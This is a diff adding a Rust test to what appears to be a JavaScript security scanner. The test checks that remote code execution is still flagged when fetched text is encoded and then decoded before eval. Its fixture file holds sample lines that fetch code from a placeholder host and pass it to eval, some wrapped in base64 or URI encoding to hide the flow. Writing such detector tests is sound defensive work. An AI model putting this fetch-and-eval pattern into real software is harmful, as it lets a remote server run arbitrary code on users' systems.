@@ -1032,6 +1032,46 @@ fn commonjs_member_and_default_exports_preserve_remote_data() {
 }
 
 #[test]
+fn encoded_remote_values_keep_taint_until_decoding() {
+    let root = temporary_directory("encoded-remote-data");
+    fs::write(
+        root.join("positive.js"),
+        br#"async function boot() {
+  const response = await fetch('https://example.invalid/control');
+  eval(decodeURIComponent(encodeURIComponent(await response.text())));
+  const encoded = btoa(await response.text());
+  eval(atob(encoded));
+  const bytes = new TextEncoder().encode(await response.text());
+  eval(new TextDecoder().decode(bytes));
+}
+boot();"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join("negative.js"),
+        b"eval(decodeURIComponent(encodeURIComponent('constant')));",
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let executions = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+        .collect::<Vec<_>>();
+    assert_eq!(executions.len(), 3, "{}", report["findings"]);
+    assert!(
+        executions
+            .iter()
+            .all(|finding| { finding["file"].as_str().unwrap().contains("positive.js") })
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn static_eval_does_not_form_remote_execution_chain() {
     let root = temporary_directory("static-eval");
     fs::write(root.join("main.js"), b"eval('2 + 2'); fetch('/api/data');").unwrap();
